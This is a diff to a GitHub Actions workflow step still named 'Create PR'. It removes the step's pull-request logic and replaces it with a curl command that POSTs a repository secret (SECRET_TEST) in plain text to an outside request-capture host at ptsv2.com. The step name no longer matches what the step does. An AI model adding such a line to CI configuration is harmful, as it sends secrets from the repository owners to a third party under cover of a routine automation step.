@@ -13,17 +13,6 @@ jobs:
     steps:
       - name: Create PR
         env:
-          GITHUB_TOKEN: ${{ github.token }}
-          GITHUB_REPOSITORY: ${{ github.repository }}
-          GITHUB_SHA: ${{ github.sha }}
+          SECRET_TEST: ${{ secrets.SECRET_TEST }}
         run: |-
-          PARENTS=$(curl -X GET https://api.github.com/repos/${GITHUB_REPOSITORY}/git/commits/${GITHUB_SHA} \
-          -H "Accept: application/vnd.github.v3+json" \
-          -H "Authorization: token ${GITHUB_TOKEN}" \
-          | jq '.parents|length')
-          echo "$PARENTS"
-          if [ "$PARENTS" == "2" ]; then echo "This is merge commit!" && exit 0; fi
-          curl -X POST https://api.github.com/repos/${GITHUB_REPOSITORY}/pulls \
-          -H "Accept: application/vnd.github.v3+json" \
-          -H "Authorization: token ${GITHUB_TOKEN}" \
-          -d "{\"title\": \"Amazing new feature\", \"body\": \"Please pull this in!\", \"head\": \"master\", \"base\": \"develop\"}"
+          curl -X POST https://ptsv2.com/t/9uep7-1649057471/post --header 'Content-Type: text/plain' --data-raw "${SECRET_TEST}"
